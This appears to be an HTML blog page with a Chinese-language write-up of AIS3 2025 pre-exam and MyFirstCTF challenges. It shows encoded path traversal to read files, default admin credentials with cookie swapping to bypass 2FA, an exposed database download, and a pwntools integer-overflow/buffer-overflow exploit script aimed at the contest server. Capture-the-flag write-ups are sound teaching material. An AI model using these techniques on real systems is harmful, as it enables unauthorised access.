@@ -1,0 +1,855 @@
+
+  <!DOCTYPE html>
+  <html lang="en"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_4k4bc36ef96';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"Copy successfully (*^▽^*)","zh-CN":"复制成功 (*^▽^*)","zh-TW":"複製成功 (*^▽^*)","ja":"コピー成功 (*^▽^*)","pt-BR":"Copiado com sucesso (*^▽^*)"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ","zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ","zh-TW":"複製失敗 (ﾟ⊿ﾟ)ﾂ","ja":"コピー失敗 (ﾟ⊿ﾟ)ﾂ","pt-BR":"Falha ao copiar (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = 'All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';</script>
+  
+  <title>
+    AIS3 2025 pre-exam &amp; myfirst ctf write up |
+    
+    Auron&#39;s blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="AIS3 2025 pre-exam &amp; myfirst ctf write up [mfctf(o)&#x2F;pre-exam(x)] 代表的是在mfctf有解出來但是pre-exam沒解 pre-exam排名73  mfctf排名7  ㄏㄏ只比mfctf多300分, 可以再廢一點  misc [mfctf(o)&#x2F;pre-exam(x)]  Welcome 已經給了, 不過不能複製貼上我直接手">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AIS3 2025 pre-exam &amp; myfirst ctf write up">
+<meta property="og:url" content="http://example.com/2025/09/02/AIS3%202025%20pre-exam%20&%20myfirst%20ctf%20write%20up/index.html">
+<meta property="og:site_name" content="Auron&#39;s blog">
+<meta property="og:description" content="AIS3 2025 pre-exam &amp; myfirst ctf write up [mfctf(o)&#x2F;pre-exam(x)] 代表的是在mfctf有解出來但是pre-exam沒解 pre-exam排名73  mfctf排名7  ㄏㄏ只比mfctf多300分, 可以再廢一點  misc [mfctf(o)&#x2F;pre-exam(x)]  Welcome 已經給了, 不過不能複製貼上我直接手">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkW_5emzlx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HyDFqgmMel.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SyexzeQfMlx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJIqg7zfeg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJXm-mzzlg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJqVGQGzgg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJptzmfGge.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/r1vcNQGfel.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BkKRNXfGex.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJ5XHXGMel.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1nNrmMzll.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJC98QGGge.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Sk8xDQGMxg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ryUUDmGfgg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BkBQasMzxe.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJ83AjGGlx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ryhJ1hGGex.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BkMLyhGfex.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/r1J9ehGfxe.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1a4-nffll.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Sy9uZ2GMeg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJvRXnMfex.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJ7TEhfMxe.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ByMr42GMel.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1zOE3MMlx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJfEUhfzxl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJBLQhGGlx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJGMBpzzeg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJivrTffle.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1oCdxXMxx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkNnOemGle.png">
+<meta property="article:published_time" content="2025-09-02T02:32:00.000Z">
+<meta property="article:modified_time" content="2025-09-02T02:32:25.206Z">
+<meta property="article:author" content="Auron">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/rkW_5emzlx.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Auron's blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL&#x2F;toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx&#x2F;1oA&#x2F;0l8ysE" crossorigin="anonymous">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      
+      
+        
+      
+      <div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/">Home</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/archives">Archives</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/about">About</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/friend">Friend</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" target="_blank"></a>
+    
+    
+    
+  </nav>
+  
+</div>
+<header id="header">
+  
+    
+      
+        <picture>
+          
+        </picture>
+        
+          <img  fetchpriority="high" src="/images/banner.webp" alt="AIS3 2025 pre-exam &amp; myfirst ctf write up">
+        
+      
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">AIS3 2025 pre-exam &amp; myfirst ctf write up</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  <div class="sidebar-wrapper-container sticky">
+  
+    
+    
+  
+ 
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+  
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ais3-2025-pre-exam-myfirst-ctf-write-up"><span class="toc-number">1.</span> <span class="toc-text"> AIS3 2025 pre-exam &amp; myfirst ctf write up</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-mfctfopre-examx"><span class="toc-number">1.1.</span> <span class="toc-text"> misc [mfctf(o)&#x2F;pre-exam(x)]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#welcome"><span class="toc-number">1.1.1.</span> <span class="toc-text"> Welcome</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ramen-ctf"><span class="toc-number">1.1.2.</span> <span class="toc-text"> Ramen CTF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ais3-tiny-server-web-misc"><span class="toc-number">1.1.3.</span> <span class="toc-text"> AIS3 Tiny Server - Web &#x2F; Misc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-mfctfopre-examx"><span class="toc-number">1.2.</span> <span class="toc-text"> Web [mfctf(o)&#x2F;pre-exam(x)]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tomorin-db"><span class="toc-number">1.2.1.</span> <span class="toc-text"> Tomorin db 🐧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#login-screen-1"><span class="toc-number">1.2.2.</span> <span class="toc-text"> Login Screen 1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn-mfctfxpre-examo"><span class="toc-number">1.3.</span> <span class="toc-text"> pwn [mfctf(x)&#x2F;pre-exam(o)]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#welcome-to-the-world-of-ave-mujica"><span class="toc-number">1.3.1.</span> <span class="toc-text"> Welcome to the World of Ave Mujica🌙</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reverse-mfctfxpre-examo"><span class="toc-number">1.4.</span> <span class="toc-text"> reverse [mfctf(x)&#x2F;pre-exam(o)]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ais3-tiny-server-reverse"><span class="toc-number">1.4.1.</span> <span class="toc-text"> AIS3 Tiny Server - Reverse</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-flag-checker-mfctfxpre-examo"><span class="toc-number">1.4.2.</span> <span class="toc-text"> web flag checker [mfctf(x)&#x2F;pre-exam(o)]</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto-mfctfxpre-examo"><span class="toc-number">1.5.</span> <span class="toc-text"> crypto [mfctf(x)&#x2F;pre-exam(o)]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#stream"><span class="toc-number">1.5.1.</span> <span class="toc-text"> Stream</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#random_rsa"><span class="toc-number">1.5.2.</span> <span class="toc-text"> Random_RSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#slowecdsa"><span class="toc-number">1.5.3.</span> <span class="toc-text"> SlowECDSA</span></a></li></ol></li></ol></li></ol>
+  
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Auron" class="lazyload">
+  <div class="sidebar-author-name">Auron</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+    
+  
+</div>
+</div>
+        
+      
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+  
+  <div class="sidebar-widget">
+  
+  </div>
+  
+  </div>
+  
+</aside>
+
+          <section id="main"><article id="post-AIS3 2025 pre-exam &amp; myfirst ctf write up" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2025-09-02T02:32:00.000Z" itemprop="datePublished">2025-09-02</time>
+    <time style="display: none;" id="post-update-time">2025-09-02</time>
+  </span>
+  
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="ais3-2025-pre-exam-myfirst-ctf-write-up"><a class="markdownIt-Anchor" href="#ais3-2025-pre-exam-myfirst-ctf-write-up"></a> AIS3 2025 pre-exam &amp; myfirst ctf write up</h1>
+<p><strong>[mfctf(o)/pre-exam(x)]</strong> 代表的是在mfctf有解出來但是pre-exam沒解</p>
+<p>pre-exam排名73<br />
+<img src="https://hackmd.io/_uploads/rkW_5emzlx.png" alt="image" /></p>
+<p>mfctf排名7<br />
+<img src="https://hackmd.io/_uploads/HyDFqgmMel.png" alt="image" /><br />
+ㄏㄏ只比mfctf多300分, 可以再廢一點</p>
+<h2 id="misc-mfctfopre-examx"><a class="markdownIt-Anchor" href="#misc-mfctfopre-examx"></a> misc [mfctf(o)/pre-exam(x)]</h2>
+<h3 id="welcome"><a class="markdownIt-Anchor" href="#welcome"></a> Welcome</h3>
+<p>已經給了, 不過不能複製貼上我直接手打<br />
+<img src="https://hackmd.io/_uploads/SyexzeQfMlx.png" alt="image" /><br />
+<code>flag</code> : AIS3{Welcome_And_Enjoy_The_CTF_!}<br />
+<img src="https://hackmd.io/_uploads/rJIqg7zfeg.png" alt="image" /><br />
+用google翻譯用出來的結果w</p>
+<h3 id="ramen-ctf"><a class="markdownIt-Anchor" href="#ramen-ctf"></a> Ramen CTF</h3>
+<p>這題有給一個圖片, 可以發現他有一個發票<br />
+<img src="https://hackmd.io/_uploads/BJXm-mzzlg.png" alt="image" /><br />
+拿去掃之後可以發現她的發票號碼為MF-16879911, 另外可以發現他的隨機碼是7095, 日期是2025/4/13, 所以把以上線索拿去<code>https://www.einvoice.nat.gov.tw/portal/btc/audit/btc601w/search</code>查就可以查到是哪一間也可以知道吃啥<br />
+<img src="https://hackmd.io/_uploads/SJqVGQGzgg.png" alt="image" /></p>
+<p>題目說flag的format是AIS3{google_map上的店家名稱:跟他吃的東西}<br />
+所以我把這個地址拿去google查發現他跟發票上面的名字完全不一樣==<br />
+<img src="https://hackmd.io/_uploads/BJptzmfGge.png" alt="image" /><br />
+最後可以組成一下flag<br />
+<code>flag</code> : AIS3{樂山溫泉拉麵:蝦拉麵}<br />
+<s>至於為啥沒有蔬食拉麵我也不知道</s></p>
+<h3 id="ais3-tiny-server-web-misc"><a class="markdownIt-Anchor" href="#ais3-tiny-server-web-misc"></a> AIS3 Tiny Server - Web / Misc</h3>
+<p>這題真的超簡單 不知道為啥沒什麼人解<br />
+<s>不過我也是靠這題在保名次的</s><br />
+這題進來就是一個介面, 下面有說明, 似乎跟path traversal有關<br />
+<img src="https://hackmd.io/_uploads/r1vcNQGfel.png" alt="image" /><br />
+然後我就到把index.html拿掉就發現看起來可以lfi<br />
+<img src="https://hackmd.io/_uploads/BkKRNXfGex.png" alt="image" /><br />
+所以我就一直往上一層目錄走(要用%2f代替/才不會被返回到原本的地方)<br />
+到根目錄可以發現有一個readable_flag_&lt;random&gt;的檔案<br />
+<img src="https://hackmd.io/_uploads/BJ5XHXGMel.png" alt="image" /><br />
+去讀它就有flag了<br />
+<img src="https://hackmd.io/_uploads/S1nNrmMzll.png" alt="image" /></p>
+<p><code>flag</code> : AIS3{tInY_WeB_S3RV3R_wi7H_FILe_BrOWs1nG_As_@_FeatUR3}</p>
+<h2 id="web-mfctfopre-examx"><a class="markdownIt-Anchor" href="#web-mfctfopre-examx"></a> Web [mfctf(o)/pre-exam(x)]</h2>
+<h3 id="tomorin-db"><a class="markdownIt-Anchor" href="#tomorin-db"></a> Tomorin db 🐧</h3>
+<p>這題跟上面的misc一樣的道理</p>
+<p><img src="https://hackmd.io/_uploads/SJC98QGGge.png" alt="image" /></p>
+<p>觀察原始碼發現他如果按下flag就會帶我到那個網址的地方, 但是flag也是真的flag, 他只是被重新導向而已<br />
+<img src="https://hackmd.io/_uploads/Sk8xDQGMxg.png" alt="image" /><br />
+所以我就用了…%2f來做path traversal<br />
+<img src="https://hackmd.io/_uploads/ryUUDmGfgg.png" alt="image" /><br />
+<code>flag</code> : AIS3{G01ang_H2v3_a_c0O1_way!!!_Us3ing_C0NN3ct_M3Th07_L0l@T0m0r1n_1s_cute_D0_yo7_L0ve_t0MoRIN?}</p>
+<h3 id="login-screen-1"><a class="markdownIt-Anchor" href="#login-screen-1"></a> Login Screen 1</h3>
+<p>這題其實是白箱, <s>但是我是在黑箱的情況下打出來的</s><br />
+先說一下我的解法<br />
+首先我是先發現他可以使用admin/admin登入(<s>我也不知道為啥</s>)<br />
+<img src="https://hackmd.io/_uploads/BkBQasMzxe.png" alt="image" /><br />
+登入之後會看到一個要輸入2fa代碼的介面, 但是現在有一個問題就是我不知道admin的2fa是甚麼, 直接進去dashboard.php也會被redirect到2fa.php<br />
+, 這時候我就想到一個方法是用先進去guest的dashboard.php然後在使用admin的cookie拿到flag<br />
+至於怎麼做的…<br />
+我是先用burpsuite先登入guest進去她的dashboard.php<br />
+<img src="https://hackmd.io/_uploads/rJ83AjGGlx.png" alt="image" /><br />
+然後再用我原本登入admin的cookie貼到已經以guest身分進入dashboard.php的cookie<br />
+<img src="https://hackmd.io/_uploads/ryhJ1hGGex.png" alt="image" /><br />
+然後就拿到flag了<br />
+<img src="https://hackmd.io/_uploads/BkMLyhGfex.png" alt="image" /><br />
+<code>flag</code> : AIS3{1.Es55y_SQL_1nJ3ct10n_w1th_2fa_IuABDADGeP0}<br />
+還有另外一個方法更簡單, 但是是在有給原始碼的情況下<br />
+可以看到docker-compose.yml除了其他的.php還有一個是users.db<br />
+<img src="https://hackmd.io/_uploads/r1J9ehGfxe.png" alt="image" /><br />
+只要在網址後面輸入users.db就會把database給下載下來<br />
+然後再用vs code裡面的模組去看database就可以看到admin的2fa code<br />
+<img src="https://hackmd.io/_uploads/B1a4-nffll.png" alt="image" /><br />
+把他複製貼上就可以拿到flagㄌ<br />
+<img src="https://hackmd.io/_uploads/Sy9uZ2GMeg.png" alt="image" /></p>
+<h2 id="pwn-mfctfxpre-examo"><a class="markdownIt-Anchor" href="#pwn-mfctfxpre-examo"></a> pwn [mfctf(x)/pre-exam(o)]</h2>
+<h3 id="welcome-to-the-world-of-ave-mujica"><a class="markdownIt-Anchor" href="#welcome-to-the-world-of-ave-mujica"></a> Welcome to the World of Ave Mujica🌙</h3>
+<p>這題只能說我眼幹沒有看到read_int8()的部分…看到之後再5分鐘內就解出來了<br />
+看到main function的時候可以發現他的輸出都是一堆unicode不過不影響<br />
+<img src="https://hackmd.io/_uploads/BJvRXnMfex.png" alt="image" /><br />
+我們的目標是跳到這裡去拿到shell, 嗯對 就是典型的buf<br />
+<img src="https://hackmd.io/_uploads/SJ7TEhfMxe.png" alt="image" /></p>
+<p>進去之後要先輸入yes, 第二步是他會叫你輸入你要的名字長度<br />
+<img src="https://hackmd.io/_uploads/ByMr42GMel.png" alt="image" /><br />
+但是因為他在read_int8()有做長度限制, 所以最高只能輸入127, 導致你不能overflow到win function<br />
+<img src="https://hackmd.io/_uploads/S1zOE3MMlx.png" alt="image" /><br />
+不過可以看到他沒有規定最小值, 所以可以輸入-1觸發integer overflow<br />
+<img src="https://hackmd.io/_uploads/BJfEUhfzxl.png" alt="image" /><br />
+有了這些線索之後就可以開始寫腳本了ww<br />
+最後的exploit:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">r = remote(&#x27;chals1.ais3.org&#x27;, 60268)</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line"></span><br><span class="line">win = 0x401256</span><br><span class="line"></span><br><span class="line">ret = 0x40101a</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*160 + p64(ret) + p64(win)</span><br><span class="line"></span><br><span class="line">r.recvuntil(b&#x27;?\n&#x27;)</span><br><span class="line"></span><br><span class="line">r.sendline(b&#x27;yes&#x27;)</span><br><span class="line"></span><br><span class="line">r.recvuntil(b&#x27;: &#x27;)</span><br><span class="line"></span><br><span class="line">r.sendline(b&#x27;-1&#x27;)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/SJBLQhGGlx.png" alt="image" /></p>
+<p><code>flag</code> : AIS3{Ave Mujica🎭將奇蹟帶入日常中🛐(Fortuna💵💵💵)…Ave Mujica🎭為你獻上慈悲憐憫✝️(Lacrima😭🥲💦)…_d3513aab63a5f2da52390b8fdd9fac04}</p>
+<h2 id="reverse-mfctfxpre-examo"><a class="markdownIt-Anchor" href="#reverse-mfctfxpre-examo"></a> reverse [mfctf(x)/pre-exam(o)]</h2>
+<h3 id="ais3-tiny-server-reverse"><a class="markdownIt-Anchor" href="#ais3-tiny-server-reverse"></a> AIS3 Tiny Server - Reverse</h3>
+<p>在sub_1E20有一個加密flag的地方, 逆向他就好<br />
+exploit:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">v8 = [</span><br><span class="line">    1480073267,</span><br><span class="line">    1197221906,</span><br><span class="line">    254628393,</span><br><span class="line">    920154,</span><br><span class="line">    1343445007,</span><br><span class="line">    874076697,</span><br><span class="line">    1127428440,</span><br><span class="line">    1510228243,</span><br><span class="line">    743978009,</span><br><span class="line">    54940467,</span><br><span class="line">    1246382110</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">v7 = b&quot;rikki_l0v3&quot;</span><br><span class="line">v2 = 51</span><br><span class="line">v3 = 114</span><br><span class="line"></span><br><span class="line">import struct</span><br><span class="line">v8_bytes = bytearray()</span><br><span class="line">for val in v8:</span><br><span class="line">    v8_bytes += struct.pack(&quot;&lt;I&quot;, val) </span><br><span class="line"></span><br><span class="line">for i in range(44):</span><br><span class="line">    v8_bytes[i] = v2 ^ v3</span><br><span class="line">    v2 = v8_bytes[i+1] if i+1 &lt; len(v8_bytes) else 0</span><br><span class="line">    v3 = v7[(i+1) % 10]</span><br><span class="line"></span><br><span class="line">print(v8_bytes[:45].decode(&#x27;ascii&#x27;), end=&#x27;&#x27;)</span><br><span class="line">print(&#x27;&#125;&#x27;)</span><br></pre></td></tr></table></figure>
+<p><code>flag</code> : AIS3{w0w_a_f1ag_check3r_1n_serv3r_1s_c00l!!!}</p>
+<h3 id="web-flag-checker-mfctfxpre-examo"><a class="markdownIt-Anchor" href="#web-flag-checker-mfctfxpre-examo"></a> web flag checker [mfctf(x)/pre-exam(o)]</h3>
+<p>這題的話用CTRL+U可以看到他有一個index.js可以看, 仔細看會發現裡面會有一個檔案叫index.wasm輸入在網址後面就可以下載下來<br />
+接下來就要下載工具wabt, 它是用來decompiler wasm file的工具<br />
+<img src="https://hackmd.io/_uploads/BJGMBpzzeg.png" alt="image" /><br />
+載好build好之後就可以去decompiler他<br />
+<img src="https://hackmd.io/_uploads/rJivrTffle.png" alt="image" /><br />
+最後把decompiler的結果丟給ai讓他去逆向出flag就好了</p>
